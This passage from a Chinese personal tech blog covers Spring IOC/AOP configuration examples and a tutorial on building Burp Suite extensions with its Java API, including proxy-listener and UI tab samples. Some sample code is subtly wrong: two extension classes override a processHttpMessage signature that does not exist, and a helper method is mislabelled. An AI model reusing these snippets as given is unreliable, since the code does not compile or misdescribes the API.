    &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
&lt;/bean&gt;

&lt;bean name=&quot;p&quot; class=&quot;pojo.Product&quot;&gt;
    &lt;property name=&quot;name&quot; value=&quot;product1&quot; /&gt;
    &lt;property name=&quot;source&quot; ref=&quot;s&quot; /&gt;
&lt;/bean&gt;
</code></pre><p>3.TestSpring.java    </p>
<pre><code>package test;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import pojo.Source;
import pojo.Product;

public class TestSpring {

    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(
                new String[] { &quot;applicationContext.xml&quot; });

        //Source s = (Source) context.getBean(&quot;s&quot;);
        Product p = (Product) context.getBean(&quot;p&quot;); 

        System.out.println(p.getName());
        System.out.println(p.getSource().getName());

    }
}
</code></pre><p>通过Spring拿到的Product对象已经被注入了Source对象<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.41.51-image.png" alt="2019-01-10.11.41.51-image.png"></p>
<h4 id="注解方式演示IOC-DI-对注入对象的注解"><a href="#注解方式演示IOC-DI-对注入对象的注解" class="headerlink" title="注解方式演示IOC/DI(对注入对象的注解)"></a>注解方式演示IOC/DI(对注入对象的注解)</h4><p>1.修改applicationContext.xml    </p>
<pre><code>&lt;context:annotation-config/&gt;  
 &lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
     &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
 &lt;/bean&gt;
 &lt;bean name=&quot;p&quot; class=&quot;pojo.Product&quot;&gt;
     &lt;property name=&quot;name&quot; value=&quot;product1&quot; /&gt;
 &lt;/bean&gt;
</code></pre><p>2.在Product.java中,在定义对象前加<code>@Autowired</code></p>
<pre><code>@Autowired
private Source source;
</code></pre><p>也可以在setSource(Source source)前面添加    </p>
<pre><code>@Autowired
public void setSource(Source source) {
    this.source = source;
}
</code></pre><p>也可以在</p>
<pre><code>@Resource(name=&quot;s&quot;)
private Source source;
</code></pre><h4 id="对Bean本身的注解"><a href="#对Bean本身的注解" class="headerlink" title="对Bean本身的注解"></a>对Bean本身的注解</h4><p>1.修改applicationContext.xml,只新增:</p>
<pre><code>&lt;context:component-scan base-package=&quot;pojo&quot;/&gt;
</code></pre><p>作用是告诉Spring,bean都放在pojo这个包下。</p>
<p>2.注解@Component,表示该类为bean    </p>
<pre><code>@Component(&quot;p&quot;)
public class Product {

@Component(&quot;s&quot;)
public class Source {
</code></pre><p>3.因为配置在applicationContext.xml中已经删除,所以属性的初始化要在属性的声明时进行。            </p>
<pre><code>private String name=&quot;product 1&quot;;
private String name=&quot;test1&quot;;
</code></pre><p>Product.java    </p>
<pre><code>package pojo;

import javax.annotation.Resource;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

@Component(&quot;p&quot;)
public class Product {
private int id;
private String name = &quot;product 2&quot;;

@Autowired
private Source source;

public int getId() {
    return id;
}
public void setId(int id) {
    this.id = id;
}
public String getName() {
    return name;
}
public void setName(String name) {
    this.name = name;
}
public Source getSource() {
    return source;
}

public void setSource(Source source) {
    this.source = source;
 }

}
</code></pre><h2 id="AOP-Aspect-Oriented-Program-面向切面编程-1"><a href="#AOP-Aspect-Oriented-Program-面向切面编程-1" class="headerlink" title="AOP(Aspect Oriented Program)面向切面编程"></a>AOP(Aspect Oriented Program)面向切面编程</h2><p>1.jar包:<a href="http://how2j.cn/frontdownload?bean.id=1810" target="_blank" rel="noopener">http://how2j.cn/frontdownload?bean.id=1810</a></p>
<p>2.业务类:ProductService.java    </p>
<pre><code>package service
public class ProductService {

public void doSomeService(){

    System.out.println(&quot;doSomeService&quot;);

}
</code></pre><p>}</p>
<p>3.准备日志切面LoggerAspect.java<br>功能:在调用核心功能之前和之后分别打印日志,切面就是原理图中讲的那些辅助功能.将来与某个核心功能编制后,用于实现核心功能的代码:<code>Object object = joinPoint.proceed();</code></p>
<pre><code>package aspect;
import org.aspectj.lang.ProceedingJoinPoint;

public class LoggerAspect {

    public Object log(ProceedingJoinPoint joinPoint) throws Throwable {
        System.out.println(&quot;start log:&quot; + joinPoint.getSignature().getName());
        Object object = joinPoint.proceed();
        System.out.println(&quot;end log:&quot; + joinPoint.getSignature().getName());
        return object;
    }
}
</code></pre><p>4.applicationContext.xml</p>
<pre><code>&lt;bean name=&quot;se&quot; class=&quot;service.ProductService&quot;&gt;
&lt;/bean&gt;   
&lt;bean id=&quot;loggerAspect&quot; class=&quot;aspect.LoggerAspect&quot;/&gt;

&lt;aop:config&gt;
    &lt;aop:pointcut id=&quot;loggerCutpoint&quot; expression=&quot;execution(* service.ProductService.*(..)) &quot;/&gt;        
    &lt;aop:aspect id=&quot;logAspect&quot; ref=&quot;loggerAspect&quot;&gt;
    &lt;aop:around pointcut-ref=&quot;loggerCutpoint&quot; method=&quot;log&quot;/&gt;
    &lt;/aop:aspect&gt;
&lt;/aop:config&gt;    
</code></pre><p>大概讲以下这个xml的含义:<br>第一行:<code>&lt;bean name=&quot;se&quot; class=&quot;service.ProductService&quot;&gt;
    &lt;/bean&gt;</code> 是声明业务对象的<br>第二行:<code>&lt;bean id=&quot;loggerAspect&quot; class=&quot;aspect.LoggerAspect&quot;/&gt;</code>是声明日志切面的<br>第三行:<code>&lt;aop:pointcut id=&quot;loggerCutpoint&quot; expression=&quot;execution(* service.ProductService.*(..)) &quot;/&gt;</code><br>表示id为该切入点的标识符,expression表示满足该正则的方法调用后,就会进行切面操作,类似于触发了切面。<br><code>expression</code>:第一个<em>表示返回任意类型,包名为<code>service.ProductService</code>开头的类的任意方法(第二个</em>表示任意方法)(..)表示参数的任意类型和个数。<br>简单来说,第三行代码意思就是service包中的ProductService类的任意一个函数被调用,不管返回值为什么,都会触发开关,去执行切面(相当于将业务对象于辅助功能编织在一起),也就是辅助功能:<br><code>&lt;aop:aspect id=&quot;logAspect&quot; ref=&quot;loggerAspect&quot;&gt;
        &lt;aop:around pointcut-ref=&quot;loggerCutpoint&quot; method=&quot;log&quot;/&gt;</code><br>上面说的只要触发开关,就回去执行切面,这里所谓的切面其实就是一个类的方法而已。<br>id代表这个切面的名字,ref表明方法所在类,method代表方法的名字,<code>pointcut-ref=&quot;loggerCutpoint&quot;</code>表示这个切面与上面的切点关联起来的,只要上面的切点被触发,我就会在这里执行一些辅助功能。    <code>&lt;aop:around</code>表示执行的顺序。具体看AOP的基本概念。</p>
<p>5.TestSpring.java    </p>
<pre><code>package test;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import service.ProductService;

public class TestSpring {
public static void main(String[] args) {
    ApplicationContext context = new ClassPathXmlApplicationContext(
            new String[] { &quot;applicationContext.xml&quot; });
    ProductService s = (ProductService) context.getBean(&quot;se&quot;);
    s.doSomeService();
}
</code></pre><p>}</p>
<p>执行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.17.24.40-image.png" alt="2019-01-10.17.24.40-image.png"></p>
<h3 id="AOP的几个重要概念"><a href="#AOP的几个重要概念" class="headerlink" title="AOP的几个重要概念"></a>AOP的几个重要概念</h3><p>1.通知<br>定义了切面何时工作及工作内容,即什么时候去执行切面程序与功能具体的代码。这里一共有5种类型,分别为</p>
<pre><code>a.Before 在方法之前调用通知
b.After 在方法之后调用通知,无论是否执行成功
c.around 在方法之前与之后都调用
d.After-Return    方法执行成功后调用
e.After-throwing    方法抛出异常后调用
</code></pre><p>执行顺序:            </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.17.05.53-image.png" alt="2019-01-10.17.05.53-image.png">            </p>
<p>&lt;aop:aspect id=”logAspect” ref=”loggerAspect”&gt;<br>            &lt;aop:around pointcut-ref=”loggerCutpoint” method=”log”/&gt;<br>        &lt;/aop:aspect&gt;</p>
<p>2.连接点<br>在执行正常功能时,能够插入切面的点,连接点可以是调用方法时、抛出异常时、甚至修改字段时,在这些点,就可以去执行切面            </p>
<p>3.切面<br>定义:切面是切点与通知的集合,通知和切点定义了切面的全部功能—(它是什么,在何时何处完成其功能)<br>声明切面:<code>&lt;aop:aspect&gt;</code>完成的,ref指定类,pointcut-ref,pointcut-ref表明与哪个切点联系,method指定要执行的方法。    </p>
<p>4.切点<br>通知定义了”何时”与”什么”,而切点定义了”何处”<br>作用:定义通知被调用的位置(在哪些连接点)<br>声明切点：<br><strong>a.在\&lt;<a href="aop:config\" target="_blank" rel="noopener">aop:config\</a>&gt;标签下使用\&lt;<a href="aop:pointcut\" target="_blank" rel="noopener">aop:pointcut\</a>&gt;声明一个切入点Bean</strong>该切入点可被多个切面使用,对于需要共享的切入点最好使用该方式。</p>
<pre><code>&lt;aop:config&gt;  
   &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* cn.javass..*.*(..))&quot;/&gt;  
   &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
      &lt;aop:before pointcut-ref=&quot;pointcut&quot; method=&quot;before&quot;/&gt;  
   &lt;/aop:aspect&gt;  
&lt;/aop:config&gt;
</code></pre><p>&lt;aop:pointcut id=”loggerCutpoint” expression=”execution(<em> service.ProductService.</em>(..)) “/&gt;        </p>
<p><strong>b.在<a href="aop:aspect" target="_blank" rel="noopener">aop:aspect</a>标签下使用<a href="aop:pointcut" target="_blank" rel="noopener">aop:pointcut</a>声明一个切入点Bean</strong>该切入点一般只用于该切面。</p>
<pre><code>&lt;aop:config&gt;  
 &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
    &lt;aop:pointcut id=&quot; pointcut&quot; expression=&quot;execution(* cn.javass..*.*(..))&quot;/&gt;  
    &lt;aop:before pointcut-ref=&quot;pointcut&quot; method=&quot;before&quot;/&gt;  
 &lt;/aop:aspect&gt;  
&lt;/aop:config&gt;  
</code></pre><p><strong>c.匿名切入点Bean，可以在声明通知时通过pointcut属性指定切入点表达式，该切入点是匿名切入点，只被该通知使用</strong></p>
<pre><code>&lt;aop:config&gt;  
 &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
     &lt;aop:after pointcut=&quot;execution(* cn.javass..*.*(..))&quot; method=&quot;afterFinallyAdvice&quot;/&gt;  
 &lt;/aop:aspect&gt;  
&lt;/aop:config&gt;  
</code></pre><p>5.引入<br>允许我们向现有的类中添加方法或属性。        </p>
<p>6.织入(未理解,先占坑,有时间回来描述)        </p>
<h3 id="注解方式AOP"><a href="#注解方式AOP" class="headerlink" title="注解方式AOP"></a>注解方式AOP</h3><p>1.配置业务类    </p>
<pre><code>@Component(&quot;se&quot;)
public class ProductService {
</code></pre><p>2.注解配置切面</p>
<pre><code>@Aspect 注解表示这是一个切面
@Component 表示这是一个bean,由Spring进行管理
@Around(value = &quot;execution(* com.how2java.service.ProductService.*(..))&quot;) 表示对com.how2java.service.ProductService 这个类中的所有方法进行切面操作
</code></pre><p>LoggerAspect.java</p>
<pre><code>package aspect;

import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.springframework.stereotype.Component;


@Aspect
@Component
public class LoggerAspect {

    @Around(value = &quot;execution(* service.ProductService.*(..))&quot;)
    public Object log(ProceedingJoinPoint joinPoint) throws Throwable {
        System.out.println(&quot;start log:&quot; + joinPoint.getSignature().getName());
        Object object = joinPoint.proceed();
        System.out.println(&quot;end log:&quot; + joinPoint.getSignature().getName());
        return object;
    }
}
</code></pre><p>3.applicationContext.xml(关键)            </p>
<pre><code>//扫描aspect与service包,定位业务类与切面类
&lt;context:component-scan base-package=&quot;aspect&quot;/&gt;
&lt;context:component-scan base-package=&quot;service&quot;/&gt; 

//找到被注解了的切面类,进行切面设置
&lt;aop:aspectj-autoproxy/&gt; 
</code></pre><p>4.TestSpring.java与上一个xml设置的代码相同。<br>运行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.19.56.37-image.png" alt="2019-01-10.19.56.37-image.png">        </p>
<h3 id="AOP注解方式测试"><a href="#AOP注解方式测试" class="headerlink" title="AOP注解方式测试"></a>AOP注解方式测试</h3><p>1.jar包下载:<br><a href="http://how2j.cn/frontdownload?bean.id=1189" target="_blank" rel="noopener">jubit.jar</a><br><a href="http://how2j.cn/frontdownload?bean.id=1190" target="_blank" rel="noopener">hamcrest.jar</a></p>
<p>2.applicationContext.xml</p>
<pre><code>&lt;context:component-scan base-package=&quot;pojo&quot;/&gt;
</code></pre><p>3.Source.java</p>
<pre><code>package pojo;

import org.springframework.stereotype.Component;

@Component(&quot;s&quot;)
public class Source {
    private int id;
    private String name = &quot;test2&quot;;

public int getId() {
    return id;
}
public void setId(int id) {
    this.id = id;
}
public String getName() {
    return name;
}
public void setName(String name) {
    this.name = name;
}
</code></pre><p>}</p>
<p>3.TestSpring.java</p>
<pre><code>package test;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

import pojo.Source;
import service.ProductService;

@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(&quot;classpath:applicationContext.xml&quot;)
public class TestSpring {

@Autowired
Source s;

@Test
public void test() {
    System.out.println(s.getName());
    }
}
</code></pre><p>运行结果：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.20.37.25-image.png" alt="2019-01-10.20.37.25-image.png">        </p>
<p>参考:<br><a href="https://www.imooc.com/learn/196" target="_blank" rel="noopener">https://www.imooc.com/learn/196</a><br><a href="http://how2j.cn/k/spring/spring-ioc-di/87.html" target="_blank" rel="noopener">http://how2j.cn/k/spring/spring-ioc-di/87.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/09/Burp插件开发/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/09/Burp插件开发/" itemprop="url">Burp插件开发</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-09T08:15:41+08:00">
                2019-01-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近学习Java,想起以前大佬写的Burp插件,就照猫画虎写了几个简单的插件,简单记录下过程。</p>
</blockquote>
<hr>
<p>关于Java基础语法移步笔者以前文章：<a href="https://p0rz9.github.io/2019/01/08/Java语法基础/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/01/08/Java语法基础/</a></p>
<h3 id="Java接口"><a href="#Java接口" class="headerlink" title="Java接口"></a>Java接口</h3><h4 id="接口简介"><a href="#接口简介" class="headerlink" title="接口简介"></a>接口简介</h4><blockquote>
<p>接口（英文：Interface）在 Java 编程语言中是一个比较抽象的东西。熟悉 OOP 的同学可以用”类”的思想来理解接口。但是，要明白的是，类与接口有相似的地方同时也有很多不同的地方。</p>
</blockquote>
<h4 id="接口的声明"><a href="#接口的声明" class="headerlink" title="接口的声明"></a>接口的声明</h4><p>接口的声明语法格式如下：</p>
<pre><code>[可见度] interface 接口名称 [extends 其他的类名] {
        // 声明变量
        // 抽象方法
}
</code></pre><p>Burp的接口声明</p>
<pre><code>package burp;
public interface IBurpExtender
{
    void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks);
}
</code></pre><h4 id="接口的实现"><a href="#接口的实现" class="headerlink" title="接口的实现"></a>接口的实现</h4><blockquote>
<p>一个接口可以被另外一个接口继承，也可以被一个类实现。当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。类使用implements关键字实现接口。</p>
</blockquote>
<p>实现接口的语法    </p>
<pre><code>#!java
... implements 接口名称[, 其他接口1, 其他接口2..., ...] ...
</code></pre><hr>
<h3 id="编写Burp插件"><a href="#编写Burp插件" class="headerlink" title="编写Burp插件"></a>编写Burp插件</h3><p>编写插件应该分为三步,导入Burp提供接口—&gt;编写功能代码—&gt;导入插件</p>
<h4 id="导入Burp插件接口"><a href="#导入Burp插件接口" class="headerlink" title="导入Burp插件接口"></a>导入Burp插件接口</h4><p>1.将Burp提供的接口文件(Burp目录)导入Java项目中<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.28.35-image.png" alt="2019-01-09.16.28.35-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.30.37-image.png" alt="2019-01-09.16.30.37-image.png"></p>
<h4 id="编写插件代码"><a href="#编写插件代码" class="headerlink" title="编写插件代码"></a>编写插件代码</h4><p>新建一个BurpExtender.java文件,这是编写插件必须要写的一个类,然后编写所要实现功能的代码</p>
<h4 id="导出Jar文件并加载插件"><a href="#导出Jar文件并加载插件" class="headerlink" title="导出Jar文件并加载插件"></a>导出Jar文件并加载插件</h4><p>将上一步编写完成的插件,打包导入<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.40.25-image.png" alt="2019-01-09.16.40.25-image.png"></p>
<h3 id="BurpSuite官方接口"><a href="#BurpSuite官方接口" class="headerlink" title="BurpSuite官方接口"></a>BurpSuite官方接口</h3><p>其中最重要的就是编写代码部分,首先注意:<br>编写Burp插件必须编写BurpExtender类，实现接口IBurpExtender且声明为<code>public</code><br>IBurpExtender实现接口IBurpExtender,IProxyListener的demo:    </p>
<pre><code>package burp;
public class BurpExtender implements IBurpExtender{

  // 实现 IBurpExtender 接口的 registerExtenderCallbacks 方法
  @Override
  public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
      // TODO here
  }
}
</code></pre><p>Burp提供的接口类说明文档:<a href="https://portswigger.net/burp/extender/api/index.html" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html</a><br>下面根据接口功能的不同对接口进行分类：</p>
<p>1.插件入口和帮助接口类:<code>IBurpExtender、IBurpExtenderCallbacks、 IExtensionHelpers、IExtensionStateListener</code></p>
<pre><code>IBurpExtender接口类是Burp插件的入口，所有Burp的插件均需要实现此接口，并且 类命名为BurpExtender。IBurpExtenderCallbacks接口类是IBurpExtender接口的实现类与Burp其他各个组件（Scanner、Intruder、Spider……）、各个通信对象 （HttpRequestResponse、HttpService、SessionHandlingAction）之间的连接。 IExtensionHelpers、IExtensionStateListener这两个接口类是插件的帮助和管理操作的接口定义。IBurpExtender、IBurpExtenderCallbacks、 IExtensionHelpers、IExtensionStateListener
</code></pre><p>2.UI相关接口类:<code>IContextMenuFactory、IContextMenuInvocation、ITab、ITextEditor、 IMessageEditor、IMenuItemHandler</code></p>
<pre><code>这类接口类主要是定义Burp插件的UI显示和动作的处理事件，主要是软件交互中使用。
</code></pre><p>3.Burp工具组件接口类:<code>IInterceptedProxyMessage、IIntruderAttack、 IIntruderPayloadGenerator、IIntruderPayloadGeneratorFactory、 IIntruderPayloadProcessor、IProxyListener、IScanIssue、IScannerCheck、 IScannerInsertionPoint、IScannerInsertionPointProvider、IScannerListener、IScanQueueItem、IScopeChangeListener</code></p>
<pre><code>这些接口类的功能非常好理解，Burp在接口定义的命名中使用了的见名知意的规范，看到接口类的名称，基本就能猜测出来这个接口是适用于哪个工具组件。
</code></pre><p>4.HTTP消息处理接口类：<code>ICookie、IHttpRequestResponsePersisted、IHttpRequestResponseWithMarkers、IHttpService、 IRequestInfo、IParameter、IResponseInfo</code></p>
<pre><code>这些接口的定义主要是围绕HTTP消息通信过程中涉及的Cookie、Request、 Response、Parameter几大消息对象，通过对通信消息头、消息体的数据处理，来达到控制HTTP消息传递的目的。
</code></pre><h4 id="几个写插件常用的接口"><a href="#几个写插件常用的接口" class="headerlink" title="几个写插件常用的接口:"></a>几个写插件常用的接口:</h4><p>1.<code>registerExtenderCallbacks</code>是IBurpExtender接口的实现类,与Burp的其他组件(Scanner Intruder Spider)及通信对象连接(HttpRequestResponse HttpService SessionHandlingAction)之间的连接。</p>
<p>2.HTTP消息处理接口类:IHttpListener(注册Http监听器)  </p>
<pre><code>//注册Http监听器
public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
{    
//toolFlag:指示了发起请求或收到响应的 Burp 工具的 ID，所有的 toolFlag 定义在 IBurpExtenderCallbacks 接口中。
//messageIsRequest:指示该消息是请求消息（值为True）还是响应消息（值为False）
//messageInfo:被处理的消息的详细信息，是一个 IHttpRequestResponse 对象
}
</code></pre><p>3.<code>IHttpRequestResponse</code>类</p>
<pre><code>byte[] request_by = messageInfo.getRequest();
byte[] response = messageInfo.getResponse();
IHttpService httpService = messageInfo.getHttpService();
String Highlight = messageInfo.getHighlight();
String Comment = messageInfo.getComment();
</code></pre><p>4.<code>IHttpListener</code>接口<br>可通过调用IBurpExtenderCallbacks.registerHttpListener()注册一个HTTP监听器,Burp的任何一个接口发起HTTP请求或者收到HTTP响应都会通知此监听器。该接口可得到这些交互数据,进行分析和修改。<br>方法:        </p>
<pre><code>void processHttpMessage(int toolFlag,boolean messageIsRequest,IHttpRequestResponse messageInfo);
参数:toolFlag  发起或收到请求的插件ID,所有的ID已经在IBurpExtenderCallbacks定义好了。
    boolean messageISRequest 提示该消息是请求消息(True)还是响应消息（False）
    IHttpRequestResponse messageInfo 被处理的消息的详细消息,是一个IHttpRequestResponse对象
</code></pre><p>5.<code>IContextMenuFactory</code>类实现菜单效果</p>
<pre><code>package burp;

import java.util.ArrayList;
import java.util.List;
import javax.swing.JMenu;
import javax.swing.JMenuItem;

public class BurpExtender implements IBurpExtender, IContextMenuFactory{

@Override
public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks){

    //插件名称
    callbacks.setExtensionName(&quot;Her0in&quot;);

    //注册菜单
    callbacks.registerContextMenuFactory(this);
}


@Override
public List&lt;JMenuItem&gt; createMenuItems(final IContextMenuInvocation invocation) {

    List&lt;JMenuItem&gt; listMenuItems = new ArrayList&lt;JMenuItem&gt;();

    //子菜单
    JMenuItem menuItem;
    menuItem = new JMenuItem(&quot;子菜单&quot;);  

    //父级菜单
    JMenu jMenu = new JMenu(&quot;父菜单&quot;);

    //菜单操作
    jMenu.add(menuItem);        
    listMenuItems.add(jMenu);


    return listMenuItems;
}


@Override
public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo,
        BurpExtender helpers) {
    // TODO Auto-generated method stub

}
</code></pre><p>}</p>
<p>加载插件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.16.22.20-image.png" alt="2018-12-11.16.22.20-image.png"></p>
<p>查看效果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.16.23.21-image.png" alt="2018-12-11.16.23.21-image.png"></p>
<p>6.<code>ICookie</code>接口    </p>
<pre><code>// 此方法用于获取 Cookie 的域
java.lang.String    getDomain()

// 此方法用于获取 Cookie 的过期时间
java.util.Date  getExpiration()

// 此方法用于获取 Cookie 的名称
java.lang.String    getName()

// 此方法用于获取 Cookie 的路径
java.lang.String    getPath()

// 此方法用于获取 Cookie 的值
java.lang.String    getValue()
</code></pre><p>7.<code>IExtensionHelpers</code>接口:<br>此接口提供很多常用的辅助方法,可通过调用<code>IBurpExtenderCallbacks.getHelpers</code>获得此接口的实例。    </p>
<pre><code>byte[]  addParameter(byte[] request, IParameter parameter) //添加参数到指定的请求中,并更新Content-Length

IRequestInfo analyzeRequest(byte[] request)  //分析request的请求信息
IResponseInfo analyzeResponse(byte[] response)  //分析response的响应消息

byte[]  buildHttpMessage(java.util.List&lt;java.lang.String&gt; headers, byte[] body)  //构建请求包,返回响应报


byte[]  buildHttpRequest(java.net.URL url) //向指定的url发起get请求
java.lang.String    bytesToString(byte[] data)   //bytes到String的转换
java.lang.String    bytesToString(byte[] data)   //String到bytes的转换


实例：
private IExtensionHelpers helpers;

this.helpers = callbacks.getHelpers();

byte[] request = messageInfo.getRequest();
IRequestInfo a = helpers.analyzeRequest(request);
</code></pre><p>8.<code>IHttpRequestResponse</code>接口<br>该接口用于检索与更新有关HTTP消息的详细信息    </p>
<pre><code>java.lang.String getComment()          //获取用户的标注信息
java.lang.String getHighlight()       /获取用户标注的高亮信息
IHttpService getHttpService()   //获取请求响应的http服务信息    

byte[]  getRequest()  // 获取 HTTP 请求信息
byte[]  getResponse()  // 获取 HTTP 响应信息

void    setHttpService(IHttpService httpService)  //更新请求/响应HTTP服务信息
void    setRequest(byte[] message)    // 更新 HTTP 请求信息
void    setResponse(byte[] message)  // 更新 HTTP 响应信息
</code></pre><p>9.<code>IHttpService</code>接口<br>此接口用于提供关于 HTTP 服务信息的细节    </p>
<pre><code>java.lang.String getHost()    
int getPort()    
java.lang.String getProtocol()    


例子:
public void processHttpMessage(int toolFlag, boolean messageIsRequest,
        IHttpRequestResponse messageInfo) {

    IHttpService iHttpService = messageInfo.getHttpService();

    this.stdout.println(&quot;Host:&quot;+iHttpService.getHost());
    this.stdout.println(&quot;Port:&quot;+iHttpService.getPort());
    this.stdout.println(&quot;Protocol:&quot;+iHttpService.getProtocol());
}
</code></pre><p>在放掉拦截的数据包后,效果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.18.01.11-image.png" alt="2018-12-11.18.01.11-image.png"></p>
<p>10.<code>IInterceptedProxyMessage</code>接口<br>该接口不能被扩展实现,它表示已被Burp代理拦截的HTTP消息。我们可以利用接口注册一个IProxyListener以得到代理消息的细节。    </p>
<pre><code>callbacks.registerProxyListener(this);  //注册代理监听器

IHttpRequestResponse message1 = message.getMessageInfo();  //请求的详细信息
int action = message.getInterceptAction();      //当前的拦截操作类型    

//获取客户端的Ip,即代理Ip
stdout.println(message.getClientIpAddress());

//获取当前的拦截操作类型  
stdout.println(action);

//获取请求的详细信息
stdout.println(message1);

// Drop 掉所有请求
//message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
</code></pre><p>11.<code>Itab</code>接口:</p>
<pre><code>package burp;
import java.awt.Component;
import java.io.PrintWriter;

import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

public class BurpExtender implements IBurpExtender, ITab {
      public PrintWriter stdout;
      public IExtensionHelpers helpers;
      private JPanel jPanel1;
      private JButton jButton1;

  @Override
  public void registerExtenderCallbacks( final IBurpExtenderCallbacks callbacks) {

      this.stdout = new PrintWriter(callbacks.getStdout(), true);
      this.helpers = callbacks.getHelpers();

      //设置扩展名
      callbacks.setExtensionName(&quot;JSON劫持检测&quot;);

       //创建我们的窗体
       SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                 //我们的主窗体
                 jPanel1 = new JPanel();
                 jButton1 = new JButton(&quot;测试按钮&quot;);

                 //将按钮添加到面板中
                 jPanel1.add(jButton1);

                 //自定义我们的组件
                 callbacks.customizeUiComponent(jPanel1);
                 //添加标签到Burp主窗体
                 callbacks.addSuiteTab(BurpExtender.this);
            }
       });
  }
  @Override
  public String getTabCaption() {
       return &quot;JSON劫持检测&quot; ;
  }

  @Override
  public Component getUiComponent() {
       return jPanel1;
  }

@Override
public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo,
        BurpExtender helpers) {
    // TODO Auto-generated method stub        
}
}
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.22.21.12-image.png" alt="2018-12-11.22.21.12-image.png"></p>
<p>我们也可以学习官方插件代码,下载JD-GUI工具:<br><a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/JD-GUI.shtml" target="_blank" rel="noopener">https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/JD-GUI.shtml</a><br>在burpsuite安装目录下的bapps目录下存放已经安装的插件源代码,用下载的JD-GUI直接打开即可看到源码。</p>
<h3 id="实战编写"><a href="#实战编写" class="headerlink" title="实战编写"></a>实战编写</h3><p>Jsonp劫持插件:<br><a href="https://github.com/P0rZ9/Burp_Extender/tree/master/Json_Hijacking" target="_blank" rel="noopener">插件源码</a></p>
<p><a href="https://github.com/P0rZ9/Burp_Extender/raw/master/Json_Hijacking/Burp/Json_Hijacking.jar" target="_blank" rel="noopener">插件成品</a></p>
<p>Http请求入库插件:<br><a href="https://github.com/P0rZ9/Burp_Extender/tree/master/Http_to_Mysql/Http_to_Mysql" target="_blank" rel="noopener">插件源码</a></p>
<p><a href="https://github.com/P0rZ9/Burp_Extender/raw/master/Http_to_Mysql/Http_to_Mysql/http-to-mysql.jar" target="_blank" rel="noopener">插件成品</a></p>
<p><strong>注:如插件要导入其他扩展包,如需要使用数据库操作(需导入mysql-connector-java-bin.jar),在加载到Burp时应将几个Jar打包为一个文件:</strong></p>
<pre><code>1.将项目引入的jar包跟项目导出的包放入当前目录下
